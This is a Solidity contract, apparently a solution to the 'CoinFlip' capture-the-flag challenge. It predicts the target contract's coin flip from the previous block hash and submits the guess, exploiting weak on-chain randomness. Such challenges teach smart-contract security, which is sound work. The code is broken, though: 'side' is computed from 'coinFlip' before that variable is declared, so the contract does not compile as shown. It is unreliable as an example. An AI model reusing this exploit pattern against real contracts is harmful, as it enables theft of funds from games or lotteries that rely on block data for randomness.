pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Solver {
    using SafeMath for uint256;
    CoinFlip public challenge;
    uint256 lastHash;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address addr) {
        challenge = CoinFlip(addr);
    }

    function solve() external payable {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            return;
        }

        lastHash = blockValue;

        bool side = coinFlip == 1 ? true : false;
        uint256 coinFlip = blockValue.div(FACTOR);

        challenge.flip(side);
    }

    receive() external payable {}
}
